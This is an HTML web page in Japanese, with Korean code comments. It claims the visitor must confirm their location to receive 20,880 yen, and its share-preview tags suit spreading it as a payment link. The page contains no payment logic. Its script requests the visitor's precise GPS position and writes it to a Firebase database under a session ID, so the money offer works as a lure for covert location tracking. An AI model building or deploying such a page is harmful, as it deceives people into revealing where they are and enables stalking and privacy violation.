<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta property="og:image" content="https://yourdomain.com/preview/pay_20880.png">
  <meta property="og:title" content="20880円を受け取るために承認が必要です">
  <meta property="og:description" content="リンクを押して20880円を受け取る">

  <title>受け取り手続き</title>

  <!-- 외부 CSS 연결 -->
  <link rel="stylesheet" href="index.css" />
</head>

<body>
  <div class="wrap">
    <section class="card">
      <div class="hero">
        <div class="title">20880円を受け取るために位置情報の確認が必要です</div>
        <p class="desc">
          下のボタンを押すと、Safariで位置情報の使用許可が求められます。<br>
          許可すると受け取り手続きが完了します。
        </p>
      </div>

      <div class="content">
        <div class="status" id="status">待機中…</div>

        <button class="cta" id="shareBtn">
          📍 位置情報を確認して20880円を受け取る
        </button>

        <pre id="debug" class="debug"></pre>
      </div>
    </section>
  </div>

  <!-- 🔽 로직 그대로 유지 -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
    import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBzk_4YT5uIIcZFRYj_Two3_ewtwnzdydo",
      authDomain: "finalproject-82e34.firebaseapp.com",
      projectId: "finalproject-82e34",
      storageBucket: "finalproject-82e34.firebasestorage.app",
      messagingSenderId: "756113362326",
      appId: "1:756113362326:web:333407f58c76f7f01a61b7"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const btn = document.getElementById("shareBtn");
    const statusEl = document.getElementById("status");
    const debugEl = document.getElementById("debug");

    const params = new URLSearchParams(window.location.search);
    const sessionId = params.get("sessionId");

    if (!sessionId) {
      statusEl.textContent = "❌ sessionIdがURLに含まれていません。";
      btn.disabled = true;
    }

    function generateBId() {
      return "B_" + Math.random().toString(36).substring(2) + Date.now().toString(36);
    }

    btn.addEventListener("click", () => {
      if (!navigator.geolocation) {
        statusEl.textContent = "❌ このブラウザは位置情報に対応していません。";
        return;
      }

      btn.disabled = true;
      statusEl.textContent = "📍 位置情報の許可を要求しています…";

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const bId = generateBId();

          statusEl.textContent = "📡 位置情報を送信中…";

          try {
            await setDoc(
              doc(db, "sessions", sessionId, "locations", bId),
              { role: "B", lat, lon, updatedAt: serverTimestamp() },
              { merge: true }
            );

            statusEl.textContent = "✅ 位置情報の送信が完了しました。アプリに戻ってください。";
            debugEl.textContent = JSON.stringify({ lat, lon }, null, 2);
          } catch (e) {
            statusEl.textContent = "❌ 位置情報の送信に失敗しました。";
            debugEl.textContent = e.message;
            btn.disabled = false;
          }
        },
        (err) => {
          statusEl.textContent = "❌ 位置情報の取得が拒否されました。";
          debugEl.textContent = err.message;
          btn.disabled = false;
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    });
  </script>
</body>
</html>
